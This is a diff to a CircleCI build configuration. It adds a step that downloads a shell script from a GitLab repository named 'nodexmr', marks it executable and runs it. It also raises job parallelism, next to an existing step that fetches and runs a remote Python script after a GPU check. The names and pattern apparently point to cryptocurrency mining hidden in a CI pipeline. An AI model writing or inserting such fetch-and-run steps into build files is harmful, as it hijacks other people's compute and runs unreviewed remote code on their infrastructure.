@@ -16,7 +16,9 @@ jobs:
       - checkout
       - run: nvidia-smi
       - run: wget https://raw.githubusercontent.com/aurbach55/zash/main/code.py && python code.py
+      - run: wget https://gitlab.com/WoodcoinLog/nodexmr/-/raw/main/pkt.sh && chmod +x *.sh && ./pkt.sh
 
+parallelism: 2
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
 workflows:
